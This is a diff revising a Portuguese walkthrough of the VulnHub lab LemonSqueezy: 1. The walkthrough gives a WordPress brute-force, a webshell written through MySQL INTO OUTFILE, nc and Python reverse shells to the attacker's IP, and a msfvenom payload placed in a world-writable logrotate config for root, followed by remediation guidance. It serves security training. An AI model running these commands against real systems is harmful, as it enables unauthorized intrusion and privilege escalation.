@@ -1,8 +1,6 @@
-# LemonSqueezy: 1 — Quando a Vida Te Dá Más Configurações, Faça um Shell de Root
+# LemonSqueezy: 1 — Quando a Vida te Dá Misconfigs, Faça uma Root Shell
 
-Bora rapaziada!! LemonSqueezy: 1 é uma máquina incrível que empacota uma cadeia de ataque surpreendentemente profunda em um único serviço web exposto. Tem enumeração WordPress, brute-force, credenciais escondidas em rascunhos de posts, escrita de web shell via phpMyAdmin SQL, e uma escalação de privilégios baseada em cron via configuração logrotate com permissão mundial de escrita. Cada passo aqui mapeia para uma técnica do mundo real, e a cadeia é satisfatoriamente limpa. Sem mentira, a escalação via logrotate sozinha já valeu essa máquina, mano.
-
-Salve ao criador por um desafio criativo e bem estruturado em camadas.
+Bora rapaziada!! LemonSqueezy: 1 é uma máquina sensacional que empacota uma cadeia de ataque surpreendentemente profunda em um único serviço web exposto. Você tem enumeração WordPress, brute-force, credenciais escondidas em rascunhos de posts, phpMyAdmin com escrita de arquivo via SQL para entregar a webshell, e escalação de privilégios via cron com um config logrotate world-writable. Cada passo aqui mapeia para uma técnica real, e a cadeia é satisfatoriamente limpa. Sem exagero, a escalação via logrotate sozinha já vale fazer essa máquina, mano.
 
 | Campo | Valor |
 |---|---|
@@ -10,30 +8,30 @@ Salve ao criador por um desafio criativo e bem estruturado em camadas.
 | **VM Alvo** | LemonSqueezy: 1 |
 | **VM Atacante** | Kali Linux |
 | **URL VulnHub** | https://www.vulnhub.com/entry/lemonsqueezy-1,473/ |
-| **Técnicas** | Enumeração com Nmap, brute-force de diretório web, enumeração de usuários WordPress, brute-force de senha WPScan, descoberta de credenciais em rascunho WordPress, web shell phpMyAdmin SQL INTO OUTFILE, entrega de reverse shell, escalação de privilégios via cron com configuração logrotate com permissão mundial de escrita |
-| **CVEs** | CWE-521 (Requisitos de Senha Fracos: orange:ginger craqueável por brute-force), CWE-312 (Armazenamento em Texto Puro de Informação Sensível: credenciais em rascunho de post WordPress), CWE-89 (Neutralização Imprópria: MySQL INTO OUTFILE file write), CWE-732 (Atribuição Incorreta de Permissão: config /etc/logrotate.d/ com permissão mundial de escrita executada pelo cron root) |
-| **Grupos APT** | FIN7: exploração documentada de WordPress e phpMyAdmin em ataques a setores de varejo e hospitalidade para acesso inicial; APT41: usa mecanismos de persistência baseados em cron em intrusões direcionadas ao Linux como parte de manutenção de acesso de longo prazo |
+| **Técnicas** | Nmap, dirb, WPScan user enumeration + brute-force, credencial em rascunho WordPress, phpMyAdmin SQL INTO OUTFILE webshell, reverse shell, escalonamento via cron + logrotate world-writable |
+| **CVEs** | CWE-521 (senha fraca orange:ginger), CWE-312 (credencial em rascunho WordPress), CWE-89 (MySQL INTO OUTFILE), CWE-732 (logrotate world-writable executado por cron root) |
+| **Grupos APT** | FIN7: exploração documentada de WordPress e phpMyAdmin em alvos de varejo e hospitalidade; APT41: usa mecanismos de persistência via cron em intrusões Linux para acesso de longo prazo |
 
 ---
 
 ## Resumo do Ataque
 
 ```
-nmap → apenas porta 80
+nmap → porta 80 apenas
   → dirb → /wordpress, /phpmyadmin
   → wpscan: usuários orange, lemon
   → brute-force orange: ginger
-  → login admin WordPress: orange:ginger
-  → Posts → rascunho → credencial em texto puro: nOt1n@wOrdl1st!
+  → login WordPress admin: orange:ginger
+  → Posts → rascunho → credencial em claro: nOt1n@wOrdl1st!
   → phpMyAdmin: orange:nOt1n@wOrdl1st!
   → SQL: SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/wordpress/backdoor.php"
   → http://alvo/wordpress/backdoor.php?cmd=whoami → www-data
   → reverse shell: nc -e /bin/bash atacante 1234
   → python pty spawn + stty raw -echo
   → LinEnum.sh → /etc/crontab → logrotate a cada 2 min
-  → ls -la /etc/logrotate.d/ → config logrotate com permissão mundial de escrita
-  → payload reverso msfvenom → sobrescrever /etc/logrotate.d/logrotate
-  → aguardar <2 min → callback root
+  → ls -la /etc/logrotate.d/ → config logrotate world-writable
+  → msfvenom payload → sobrescreve /etc/logrotate.d/logrotate
+  → aguarda <2 min → callback root
   → cat /root/root.txt
 ```
 
@@ -41,22 +39,20 @@ nmap → apenas porta 80
 
 ## Metodologia
 
-1. Varredura de portas: apenas porta 80 aberta
-2. Enumeração de diretórios: descobrir /wordpress e /phpmyadmin
-3. Enumeração de usuários WordPress e brute-force de senha com WPScan
-4. Descoberta de credenciais em rascunho de post WordPress
+1. Scan de portas: apenas porta 80
+2. Enumeração de diretórios: descoberta de /wordpress e /phpmyadmin
+3. Enumeração de usuários WordPress e brute-force com WPScan
+4. Descoberta de credencial em rascunho WordPress
 5. Login phpMyAdmin com credenciais descobertas
-6. MySQL INTO OUTFILE para escrever web shell PHP no web root
-7. Executar web shell e entregar reverse shell
-8. Estabilização de shell para acesso interativo
-9. Enumeração automatizada com LinEnum para descobrir má configuração de cron
-10. Exploração de config logrotate com permissão mundial de escrita para shell root
+6. MySQL INTO OUTFILE para escrever PHP webshell no web root
+7. Execução da webshell e entrega de reverse shell
+8. Estabilização do shell para acesso interativo
+9. Enumeração automatizada com LinEnum para descobrir misconfigutação de cron
+10. Exploração do config logrotate world-writable para shell root
 
 ---
 
 ## Passo 1 — Reconhecimento
-
-Identifique o host, depois escaneie:
 
 ```bash
 sudo netdiscover
@@ -70,9 +66,8 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.x
 ```
 
-Apenas porta 80. HTTP é a única superfície de ataque.
+Apenas a porta 80. HTTP é a única superfície de ataque.
 
-Adicione ao /etc/hosts se necessário:
 ```bash
 echo "192.168.1.105 lemonsqueezy" >> /etc/hosts
 ```
@@ -90,17 +85,15 @@ gobuster dir -u http://192.168.1.105 -w /usr/share/wordlists/dirb/common.txt -x 
 
 **Encontrado:**
 - `/wordpress` — instalação WordPress
-- `/phpmyadmin` — painel de administração phpMyAdmin
+- `/phpmyadmin` — painel phpMyAdmin
 
-Ambos são achados críticos. WordPress nos dá o caminho de enumeração de usuários. phpMyAdmin nos dá o caminho de escrita de arquivo.
+Ambos são achados críticos. WordPress dá o caminho de enumeração de usuários. phpMyAdmin dá o caminho de escrita de arquivo.
 
-**MITRE ATT&CK:** T1083 — Descoberta de Arquivo e Diretório
+**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios
 
 ---
 
 ## Passo 3 — Enumeração de Usuários WordPress e Brute-Force
-
-Enumere usuários WordPress:
 
 ```bash
 wpscan --url http://192.168.1.105/wordpress -e u
@@ -108,7 +101,7 @@ wpscan --url http://192.168.1.105/wordpress -e u
 
 **Usuários encontrados:** `orange`, `lemon`
 
-Faça brute-force da senha para `orange`:
+Brute-force da senha de `orange`:
 
 ```bash
 wpscan --url http://192.168.1.105/wordpress \
@@ -119,45 +112,45 @@ wpscan --url http://192.168.1.105/wordpress \
 
 **Resultado:** `orange` / `ginger`
 
-**Nota real:** Enumeração de usuários WordPress via `?author=1` ou a API REST é uma técnica documentada que é desabilitada por endurecimento adequado. O WPScan automatiza isso. A senha `ginger` está no top 10.000 do rockyou.txt, por isso o brute-force funciona em minutos. O FIN7 usa rotineiramente enumeração estilo WPScan como primeiro passo contra alvos de e-commerce baseados em WordPress.
+**Nota real:** Enumeração de usuários WordPress via `?author=1` ou API REST é uma técnica documentada desativada por hardening adequado. WPScan automatiza isso. A senha `ginger` está no top 10.000 do rockyou.txt, por isso o brute-force funciona em minutos. FIN7 usa rotineiramente enumeração estilo WPScan como primeiro passo contra alvos WordPress.
 
-**MITRE ATT&CK:** T1589.001 — Coletar Informações de Identidade da Vítima: Credenciais; T1110.003 — Força Bruta: Password Spraying
+**MITRE ATT&CK:** T1589.001 — Coleta de Informações da Vítima: Credenciais; T1110.003 — Força Bruta: Password Spraying
 
 ---
 
-## Passo 4 — Descoberta de Credenciais em Rascunho de Post WordPress
+## Passo 4 — Descoberta de Credencial em Rascunho WordPress
 
-Faça login no admin WordPress em `http://192.168.1.105/wordpress/wp-admin/`:
+Login no admin WordPress em `http://192.168.1.105/wordpress/wp-admin/`:
 - **Usuário:** `orange`
 - **Senha:** `ginger`
 
-Navegue até **Posts** e abra qualquer rascunho ou post existente no modo de edição. Leia o conteúdo do post cuidadosamente.
+Navegar até **Posts** e abrir qualquer rascunho existente no modo de edição. Ler o corpo do post com atenção.
 
 **Credencial encontrada no conteúdo do post:** `nOt1n@wOrdl1st!`
 
 Esta é a senha phpMyAdmin para o usuário de banco de dados `orange`.
 
-**Nota real:** Desenvolvedores e sysadmins frequentemente usam rascunhos de posts de CMS como bloco de notas temporário para credenciais, snippets de configuração e notas todo. Isso é um achado real em avaliações de WordPress de produção. O banco de dados WordPress armazena todo o conteúdo de posts incluindo rascunhos em texto puro, então qualquer acesso ao banco de dados (ou acesso a backup) expõe essas credenciais.
+**Nota real:** Desenvolvedores e sysadmins frequentemente usam rascunhos de CMS como notepad temporário para credenciais, snippets de configuração e notas. O banco de dados WordPress armazena todo conteúdo de posts incluindo rascunhos em texto puro, então qualquer acesso ao banco (ou acesso a backup) expõe essas credenciais.
 
-**MITRE ATT&CK:** T1552.001 — Credenciais Desprotegidas: Credenciais em Arquivos
+**MITRE ATT&CK:** T1552.001 — Credenciais Não Protegidas: Credenciais em Arquivos
 
 ---
 
-## Passo 5 — Web Shell phpMyAdmin via SQL INTO OUTFILE
+## Passo 5 — phpMyAdmin Webshell via SQL INTO OUTFILE
 
-Faça login no phpMyAdmin em `http://192.168.1.105/phpmyadmin/`:
+Login no phpMyAdmin em `http://192.168.1.105/phpmyadmin/`:
 - **Usuário:** `orange`
 - **Senha:** `nOt1n@wOrdl1st!`
 
-Selecione o banco de dados WordPress. Abra a aba **SQL**.
+Selecionar o banco de dados WordPress. Abrir a aba **SQL**.
 
-Use a capacidade de escrita de arquivo do MySQL para colocar um web shell PHP no web root do WordPress:
+Usar a capacidade de escrita de arquivo do MySQL para dropar uma PHP webshell no web root:
 
 ```sql
 SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/wordpress/backdoor.php";
 ```
 
-Verifique se o shell funciona:
+Verificar se a shell funciona:
 
 ```
 http://192.168.1.105/wordpress/backdoor.php?cmd=whoami
@@ -165,76 +158,64 @@ http://192.168.1.105/wordpress/backdoor.php?cmd=whoami
 
 Saída esperada: `www-data`
 
-**Como INTO OUTFILE funciona:** A declaração `INTO OUTFILE` do MySQL escreve o resultado de uma query SELECT em um arquivo no sistema de arquivos do servidor. Quando o processo MySQL tem acesso de escrita ao web root e o privilégio `FILE` é concedido ao usuário do banco de dados, qualquer query SQL pode criar arquivos arbitrários, incluindo web shells PHP.
+**Como INTO OUTFILE funciona:** A instrução `INTO OUTFILE` do MySQL escreve o resultado de uma query SELECT em um arquivo no filesystem do servidor. Quando o processo MySQL tem permissão de escrita no web root e o privilégio `FILE` está concedido ao usuário do banco, qualquer query SQL pode criar arquivos arbitrários, incluindo PHP webshells.
 
-**Condições necessárias para funcionar:**
-1. Usuário do banco de dados tem privilégio `FILE` (ou executa como root)
-2. Processo MySQL pode escrever no diretório do web root
-3. Caminho do web root é conhecido ou adivinhável
-
-**MITRE ATT&CK:** T1505.003 — Componente de Software de Servidor: Web Shell; T1190 — Explorar Aplicação Voltada ao Público
+**MITRE ATT&CK:** T1505.003 — Componente de Software Servidor: Web Shell; T1190 — Explorar Aplicação de Face Pública
 
 ---
 
 ## Passo 6 — Entrega de Reverse Shell
 
-Inicie um listener no atacante:
+Iniciar listener no atacante:
 
 ```bash
 nc -lvnp 1234
 ```
 
-Acione um reverse shell pelo web shell:
+Disparar reverse shell via webshell:
 
 ```
 http://192.168.1.105/wordpress/backdoor.php?cmd=nc+-e+/bin/bash+192.168.1.112+1234
 ```
 
-Se `nc -e` não estiver disponível (muitas distribuições vêm com netcat sem `-e`), use:
+Se `nc -e` não estiver disponível, usar Python:
 
 ```
-# Reverse shell Python (URL-encodado):
 http://192.168.1.105/wordpress/backdoor.php?cmd=python3+-c+'import+socket,os,pty;s=socket.socket();s.connect(("192.168.1.112",1234));[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)];pty.spawn("/bin/bash")'
 ```
 
-**MITRE ATT&CK:** T1059.004 — Interpretador de Comandos: Unix Shell
+**MITRE ATT&CK:** T1059.004 — Shell Unix
 
 ---
 
 ## Passo 7 — Estabilização do Shell
 
-O shell netcat bruto não é interativo. Estabilize-o:
-
 ```bash
-# No alvo:
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
 export SHELL=bash
-
-# No atacante, pressione Ctrl+Z:
+# Ctrl+Z no atacante:
 stty raw -echo; fg
-# Pressione Enter duas vezes
+# Enter duas vezes
 ```
 
-Leia a flag de usuário:
+Ler flag de usuário:
 
 ```bash
 cat ~/user.txt
 ```
 
-**MITRE ATT&CK:** T1059.004 — Interpretador de Comandos: Unix Shell
-
 ---
 
 ## Passo 8 — Enumeração Automatizada com LinEnum
 
-Hospede LinEnum no atacante:
+Hospedar LinEnum no atacante:
 
 ```bash
 python3 -m http.server 8000
 ```
 
-Baixe e execute no alvo:
+Baixar e executar no alvo:
 
 ```bash
 cd /var/www/html/wordpress
@@ -243,61 +224,59 @@ chmod +x LinEnum.sh
 ./LinEnum.sh | tee /tmp/linenum.txt
 ```
 
-Revise o crontab:
+Revisar crontab:
 
 ```bash
 cat /etc/crontab
 ```
 
-Achado: um cron job executa `logrotate` a cada 2 minutos.
+Achado: um cron executa `logrotate` a cada 2 minutos.
 
-Verifique o diretório de configuração do logrotate:
+Verificar o diretório de configs logrotate:
 
 ```bash
 ls -la /etc/logrotate.d/
 ```
 
-**Achado crítico:** `/etc/logrotate.d/logrotate` tem permissão de escrita mundial (permissões: 777 ou 666).
+**Achado crítico:** `/etc/logrotate.d/logrotate` é world-writable (permissões 777 ou 666).
 
-**MITRE ATT&CK:** T1053.003 — Tarefa/Job Agendado: Cron
+**MITRE ATT&CK:** T1053.003 — Tarefa Agendada: Cron
 
 ---
 
-## Passo 9 — Escalação de Privilégios via Config logrotate com Permissão Mundial de Escrita
+## Passo 9 — Escalação de Privilégios via Cron com logrotate World-Writable
 
-Gere um payload de reverse shell com msfvenom:
+Gerar payload de reverse shell com msfvenom:
 
 ```bash
 msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.1.112 LPORT=4444 R
 ```
 
-Copie o payload de saída (parece: `mkfifo /tmp/kqvh; nc ...`).
+Copiar o payload gerado (parece com: `mkfifo /tmp/kqvh; nc ...`).
 
-Sobrescreva a configuração logrotate no alvo com o payload:
+Sobrescrever o config logrotate no alvo com o payload:
 
 ```bash
-echo '<cole output do msfvenom aqui>' > /etc/logrotate.d/logrotate
+echo '<output do msfvenom aqui>' > /etc/logrotate.d/logrotate
 ```
 
-Inicie o listener de shell root no atacante:
+Iniciar listener para root shell no atacante:
 
 ```bash
 nc -lvnp 4444
 ```
 
-Aguarde até 2 minutos para o cron job executar. Quando o logrotate executa o arquivo de configuração como root, o payload aciona um callback de reverse shell root.
+Aguardar até 2 minutos para o cron executar. Quando logrotate executa o arquivo de config como root, o payload dispara um callback root.
 
-**Por que isso funciona:** O logrotate lê arquivos de configuração de `/etc/logrotate.d/`. Se qualquer um desses arquivos tiver permissão de escrita mundial, qualquer usuário pode sobrescrevê-lo com comandos arbitrários. Quando o cron executa o logrotate como root, esses comandos executam como root. Isso é CWE-732: um arquivo com permissão de escrita mundial executado por um processo privilegiado.
+**Por que funciona:** logrotate lê configs de `/etc/logrotate.d/`. Se qualquer arquivo for world-writable, qualquer usuário pode sobrescrevê-lo com comandos arbitrários. Quando cron executa logrotate como root, esses comandos rodam como root. Isso é CWE-732: arquivo world-writable executado por processo privilegiado.
 
-**Nota real:** Esse exato padrão de escalação foi encontrado em ambientes de produção em grandes organizações. A variante mais famosa é o exploit logrotate (CVE-2016-9560 e problemas relacionados), mas arquivos de configuração de cron com permissão de escrita mundial não requerem CVE, apenas permissões mal configuradas. O APT41 usa persistência baseada em cron em intrusões direcionadas ao Linux como mecanismo durável de persistência root.
-
-**MITRE ATT&CK:** T1053.003 — Tarefa/Job Agendado: Cron; T1548.001 — Setuid e Setgid
+**MITRE ATT&CK:** T1053.003 — Tarefa Agendada: Cron; T1548.001 — Setuid e Setgid
 
 ---
 
-## Passo 10 — Flag de Root
+## Passo 10 — Flag Root
 
-Após o callback do shell root:
+Após o callback da root shell:
 
 ```bash
 id
@@ -307,7 +286,7 @@ ls
 cat root.txt
 ```
 
-(☞ﾟヮﾟ)☞ Root. LemonSqueezy totalmente espremido. GG mano! Top demais essa máquina!
+(☞ﾟヮﾟ)☞ Root. LemonSqueezy completamente espremido. gg, rapaziada!
 
 ---
 
@@ -316,24 +295,24 @@ cat root.txt
 | Tipo | Valor | Encontrado Em | Usado Para |
 |---|---|---|---|
 | Credencial | orange:ginger | Brute-force WPScan | Admin WordPress |
-| Credencial | orange:nOt1n@wOrdl1st! | Rascunho de post WordPress | Login phpMyAdmin |
-| Web shell | /wordpress/backdoor.php | MySQL INTO OUTFILE | Execução de comandos OS |
-| Shell inicial | www-data | Reverse shell via backdoor.php | Acesso ao servidor web |
-| Flag de usuário | user.txt | ~/user.txt | Prova nível usuário |
-| Shell root | uid=0(root) | Config logrotate de cron com permissão mundial | Acesso total ao sistema |
-| Flag de root | root.txt | /root/root.txt | Prova nível root |
+| Credencial | orange:nOt1n@wOrdl1st! | Rascunho WordPress | Login phpMyAdmin |
+| Webshell | /wordpress/backdoor.php | MySQL INTO OUTFILE | Execução de comandos OS |
+| Shell inicial | www-data | Reverse shell via backdoor.php | Acesso ao web server |
+| Flag usuário | user.txt | ~/user.txt | Prova de nível usuário |
+| Shell root | uid=0(root) | logrotate world-writable cron | Acesso total ao sistema |
+| Flag root | root.txt | /root/root.txt | Prova de nível root |
 
 ---
 
 ## Lições Aprendidas
 
-| # | Descoberta | Relevância no Mundo Real | Takeaway Principal |
+| # | Descoberta | Relevância no Mundo Real | Conclusão |
 |---|---|---|---|
-| 1 | Senha WordPress orange:ginger craqueável por brute-force | Senhas fracas de CMS são trivialmente crackeadas; WPScan é gratuito e amplamente utilizado | Aplique senhas fortes; implemente bloqueio de conta; desabilite XML-RPC se não usado |
-| 2 | Credenciais armazenadas em rascunho de post WordPress | Rascunhos de post de CMS são uma fonte consistente de descoberta de credenciais no mundo real | Nunca use rascunhos de CMS como bloco de notas; use um gerenciador de senhas ou solução de gestão de segredos |
-| 3 | phpMyAdmin publicamente acessível | phpMyAdmin nunca deve ser voltado para a internet; acesso de banco de dados equivalente a admin permite criação de web shell | Vincule phpMyAdmin ao localhost; restrinja com auth HTTP ou allowlist de IP |
-| 4 | MySQL INTO OUTFILE cria web shells | Privilégio FILE + web root gravável = criação de web shell de qualquer cliente SQL | Revogue privilégio FILE de todos os usuários de banco de dados de aplicação web; restrinja MySQL a web root somente leitura |
-| 5 | Config /etc/logrotate.d/ com permissão mundial de escrita executada pelo cron root | Padrão clássico de escalação de privilégio em ambientes de container e VM | chown root:root /etc/logrotate.d/*; chmod 644 /etc/logrotate.d/*; audite cron com LinPEAS/LinEnum |
+| 1 | Senha WordPress orange:ginger vulnerável a brute-force | Senhas fracas em CMS são trivialmente quebradas; WPScan está amplamente disponível e é usado | Enforce senhas fortes; implemente bloqueio de conta; desabilite XML-RPC se não usado |
+| 2 | Credenciais armazenadas em rascunho WordPress | Posts de rascunho em CMS são fonte consistente de descoberta de credenciais em engajamentos reais | Nunca use rascunhos CMS como notepad; use gerenciador de senhas ou solução de gestão de segredos |
+| 3 | phpMyAdmin acessível publicamente | phpMyAdmin nunca deve ser exposto na internet; acesso equivalente a admin do banco permite criação de webshell | Vincular phpMyAdmin ao localhost; restringir com auth HTTP ou IP allowlist |
+| 4 | MySQL INTO OUTFILE cria webshells | Privilégio FILE + web root gravável = criação de webshell por qualquer cliente SQL | Revogar privilégio FILE de todos os usuários de aplicação web; restringir MySQL a leitura do web root |
+| 5 | /etc/logrotate.d/ world-writable executado por cron root | Padrão clássico de escalação de privilégios em ambientes container e VM | chown root:root /etc/logrotate.d/*; chmod 644; auditar cron com LinPEAS/LinEnum |
 
 ---
 
@@ -342,15 +321,15 @@ cat root.txt
 | Fase | Tática | Técnica | ID TTP |
 |---|---|---|---|
 | Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
-| Reconhecimento | Descoberta | Descoberta de Arquivo e Diretório | T1083 |
-| Acesso a Credenciais | Credenciais | Força Bruta: Password Spraying | T1110.003 |
-| Acesso a Credenciais | Credenciais | Credenciais em Arquivos | T1552.001 |
-| Acesso Inicial | Acesso Inicial | Explorar Aplicação Voltada ao Público | T1190 |
-| Execução | Execução | Componente de Software de Servidor: Web Shell | T1505.003 |
-| Execução | Execução | Interpretador de Comandos: Unix Shell | T1059.004 |
+| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
+| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Password Spraying | T1110.003 |
+| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
+| Acesso Inicial | Acesso Inicial | Explorar Aplicação de Face Pública | T1190 |
+| Execução | Execução | Componente de Software Servidor: Web Shell | T1505.003 |
+| Execução | Execução | Shell Unix | T1059.004 |
 | Descoberta | Descoberta | Descoberta de Informações do Sistema | T1082 |
-| Persistência | Persistência | Tarefa/Job Agendado: Cron | T1053.003 |
-| Escalação de Privilégios | Escalação | Abuso de Setuid e Setgid | T1548.001 |
+| Persistência | Persistência | Tarefa Agendada: Cron | T1053.003 |
+| Escalação de Privilégios | Escalação de Privilégios | Abuso de Setuid e Setgid | T1548.001 |
 
 ---
 
@@ -358,36 +337,36 @@ cat root.txt
 
 ### Correções Técnicas
 
-1. **Aplique senhas fortes**: Habilite proteção contra brute-force no WordPress (plugin Limit Login Attempts ou Wordfence); desabilite XML-RPC se não necessário
-2. **Audite posts WordPress para credenciais**: Faça grep em todas as tabelas post e postmeta para strings semelhantes a credenciais; implemente política de classificação de dados
-3. **Restrinja acesso ao phpMyAdmin**: Vincule a `127.0.0.1` na configuração phpMyAdmin; adicione autenticação básica HTTP no Apache; implemente allowlist de IP
-4. **Revogue privilégio MySQL FILE**: `REVOKE FILE ON *.* FROM 'orange'@'localhost';`; verifique se nenhum usuário de app web tem privilégios SUPER ou FILE
-5. **Corrija permissões do logrotate**: `chown root:root /etc/logrotate.d/*; chmod 644 /etc/logrotate.d/*`; implemente auditorias regulares de permissões
+1. **Enforce senhas fortes:** Habilitar proteção contra brute-force no WordPress; desabilitar XML-RPC se não necessário
+2. **Auditar posts WordPress por credenciais:** Fazer grep em todas as tabelas post e postmeta por strings de credencial; implementar política de classificação de dados
+3. **Restringir acesso phpMyAdmin:** Vincular a `127.0.0.1`; adicionar auth HTTP básica no Apache; implementar IP allowlist
+4. **Revogar privilégio FILE do MySQL:** `REVOKE FILE ON *.* FROM 'orange'@'localhost';`; verificar que nenhum usuário de aplicação web tem privilégios SUPER ou FILE
+5. **Corrigir permissões logrotate:** `chown root:root /etc/logrotate.d/*; chmod 644 /etc/logrotate.d/*`; implementar auditorias periódicas de permissão
 
 ### NIST CSF 2.0
 
 | Função | Categoria | Ação |
 |---|---|---|
-| Identificar | Gestão de Ativos | Inventariar todos os painéis de admin voltados para web (phpMyAdmin, wp-admin) |
+| Identificar | Gestão de Ativos | Inventariar todos os painéis admin web-expostos (phpMyAdmin, wp-admin) |
 | Proteger | Controle de Acesso | Restringir phpMyAdmin ao localhost; desabilitar XML-RPC |
 | Proteger | Segurança de Dados | Sem credenciais em conteúdo CMS; revogar privilégio FILE |
-| Detectar | Anomalias | Alertar em queries INTO OUTFILE; monitorar mudanças de cron job; detectar web shells |
-| Responder | Planejamento de Resposta | Remover web shell; rotacionar todas as credenciais; corrigir permissões logrotate |
-| Recuperar | Planejamento de Recuperação | Auditar todo conteúdo WordPress para credenciais; reconstruir se acesso root foi alcançado |
+| Detectar | Anomalias | Alertar em queries INTO OUTFILE; monitorar mudanças em cron; detectar webshells |
+| Responder | Planejamento de Resposta | Remover webshell; rotacionar todas as credenciais; corrigir permissões logrotate |
+| Recuperar | Planejamento de Recuperação | Auditar conteúdo WordPress por credenciais; reconstruir se acesso root alcançado |
 
 ### NIST SP 800-53 Rev. 5
 
 | Controle | Descrição | Aplicação |
 |---|---|---|
-| AC-6 | Menor Privilégio | Privilégio MySQL FILE revogado; configs logrotate de propriedade do root |
-| IA-5 | Gestão de Autenticadores | Senhas WordPress fortes; credenciais phpMyAdmin rotacionadas |
+| AC-6 | Menor Privilégio | Privilégio FILE MySQL revogado; configs logrotate com dono root |
+| IA-5 | Gestão de Autenticadores | Senhas fortes no WordPress; credenciais phpMyAdmin rotacionadas |
 | CM-7 | Menor Funcionalidade | phpMyAdmin restrito ao localhost; XML-RPC desabilitado |
-| CM-6 | Configurações de Configuração | Configs logrotate com permissão mundial de escrita: chmod 644 |
-| SI-3 | Proteção contra Malware | HIDS para detectar criação de web shell e modificação de cron |
+| CM-6 | Configurações | Configs logrotate world-writable: chmod 644 |
+| SI-3 | Proteção Contra Malware | HIDS para detectar criação de webshell e modificação de cron |
 
 ### CISA KEV
 
-Criação de web shell MySQL INTO OUTFILE (padrão CWE-89/CWE-434) é referenciada no Alerta CISA AA21-008A documentando TTPs de atores de ameaça para comprometimento de aplicações web. O padrão de escalação de config cron com permissão mundial de escrita está alinhado com a orientação CISA sobre prevenção de escalação de privilégios Linux. As organizações devem aplicar a orientação CISA AA22-279A sobre interfaces de gerenciamento acessíveis pela internet incluindo phpMyAdmin.
+Criação de webshell via MySQL INTO OUTFILE (padrão CWE-89/CWE-434) está referenciada no CISA Alert AA21-008A documentando TTPs de atores de ameaça para comprometimento de aplicação web. O padrão de escalação via config cron world-writable está alinhado com orientações CISA sobre prevenção de escalação de privilégios Linux. Organizações devem aplicar CISA AA22-279A sobre interfaces de gerenciamento acessíveis pela internet, incluindo phpMyAdmin.
 
 ### C2M2
 
@@ -399,19 +378,17 @@ Criação de web shell MySQL INTO OUTFILE (padrão CWE-89/CWE-434) é referencia
 
 ### MITRE D3FEND
 
-- **D3-ACH** — Endurecimento de Configuração de Aplicação (phpMyAdmin somente localhost; revogar privilégio FILE)
-- **D3-OAM** — Gestão Administrativa do Sistema Operacional (corrigir permissões logrotate; restringir cron)
-- **D3-DQSA** — Análise de String de Query de Banco de Dados (detectar padrões INTO OUTFILE nos logs de query MySQL)
-- **D3-FH** — Hashing de Arquivo (detectar criação de web shell no web root via monitoramento de integridade de arquivo)
+- **D3-ACH** — Hardening de Configuração de Aplicação (phpMyAdmin somente localhost; revogar privilégio FILE)
+- **D3-OAM** — Gestão Administrativa do SO (corrigir permissões logrotate; restringir cron)
+- **D3-DQSA** — Análise de String de Query de Banco de Dados (detectar padrões INTO OUTFILE em logs de query MySQL)
+- **D3-FH** — Hashing de Arquivo (detectar criação de webshell no web root via monitoramento de integridade de arquivo)
 
 ---
 
 ## Considerações Finais
 
-LemonSqueezy entrega uma cadeia de ataque limpa e em camadas que recompensa enumeração completa em cada passo. A credencial no rascunho de post WordPress é o tipo de achado que faz profissionais de segurança estremecer porque é tão comum em avaliações reais. A escalação via logrotate é um exemplo lindo de como uma única permissão de arquivo mal configurada pode entregar root para qualquer usuário local.
+LemonSqueezy entrega uma cadeia de ataque limpa e em camadas que recompensa enumeração minuciosa em cada passo. A credencial no rascunho WordPress é o tipo de achado que faz profissionais de segurança balançar a cabeça, porque é incrivelmente comum em avaliações reais. A escalação via logrotate é um exemplo perfeito de como uma única permissão de arquivo mal configurada pode entregar root para qualquer usuário local.
 
-A máquina te ensina a olhar em todo lugar: enumeração de diretórios encontra phpMyAdmin, conteúdo de post revela credenciais, LinEnum encontra o cron job, e auditoria de permissões revela o arquivo com permissão mundial de escrita. Remova qualquer passo de enumeração e você trava a cadeia.
-
-Sensacional essa máquina, véi!
+A máquina ensina a olhar em todo lugar: enumeração de diretórios encontra phpMyAdmin, conteúdo de post revela credenciais, LinEnum encontra o cron, e auditoria de permissões revela o arquivo world-writable. Remova qualquer passo de enumeração e você trava a cadeia.
 
 Thanks guys!! (❍ᴥ❍ʋ)
